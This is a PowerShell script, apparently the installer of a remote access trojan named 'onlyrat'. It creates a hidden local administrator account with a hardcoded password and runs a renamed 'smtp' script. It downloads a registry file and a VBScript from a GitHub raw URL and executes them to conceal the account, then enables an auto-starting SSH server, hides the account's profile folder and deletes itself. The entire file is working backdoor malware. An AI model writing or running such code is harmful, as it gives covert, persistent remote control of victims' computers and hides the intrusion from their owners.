# Function to generate a random string for directory names
function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % { [char]$_ })
}

# Function to create a local admin account
function Create-NewLocalAdmin {
    [CmdletBinding()]
    param (
        [string] $NewLocalAdmin,
        [securestring] $Password
    )
    begin {
    }
    process {
        # New-LocalUser $uname -Password $pword -FullName $uname -Description "Temporary local admin" -AccountNeverExpires
        # Write-Verbose "$uname local user created"
        # Add-LocalGroupMember -Group "Administrators" -Member $uname
        # # Write-Verbose "$uname added to the local administrators group"

        New-LocalUser "$NewLocalAdmin" -Password $Password -FullName "$NewLocalAdmin" -Description "Temporary local admin"
        Write-Verbose "$NewLocalAdmin local user created"
        Add-LocalGroupMember -Group "Administrators" -Member "$NewLocalAdmin"
        Write-Verbose "$NewLocalAdmin added to the local administator group"
    }
    end {
    }
}
# Create admin user
$NewLocalAdmin = "onlyrat"
$Password = ConvertTo-SecureString "OnlyRat1234" -AsPlainText -Force
Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password


# Variables
$wd = random_text
$path = "$env:temp\$wd"
$initial_dir = $PWD.Path


# Go to temp, make working directory
mkdir $path
Set-Location $path
Move-Item $initial_dir/smtp.txt ./smtp.ps1
./smtp.ps1


# Registry and VBScript to hide local admin
$regUrl = 'https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/wrev.reg'
$vbsUrl = 'https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/calty.vbs'

try {
    Invoke-WebRequest -Uri $regUrl -OutFile "wrev.reg"
    Invoke-WebRequest -Uri $vbsUrl -OutFile "calty.vbs"
}
catch {
    Write-Error "Failed to download files from $regUrl or $vbsUrl"
}

# Enable persistent SSH
try {
    Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
    Start-Service sshd
    Set-Service -Name sshd -StartupType 'Automatic'
}
catch {
    Write-Error "Failed to enable or start SSH service. Make sure the script is run with elevated permissions."
}

# Install the registry changes
try {
    .\wrev.reg
    .\calty.vbs
}
catch {
    Write-Error "Failed to execute registry or VBScript"
}

# Hide the onlyrat user
try {
    cd C:\Users
    attrib.exe +h +s +r onlyrat
}
catch {
    Write-Error "Failed to hide the user directory"
}

# Clean up and self delete
Set-Location $initial_dir
try {
    Remove-Item -Path "$MyInvocation.MyCommand.Path" -Force
}
catch {
    Write-Error "Failed to self-delete the script"
}
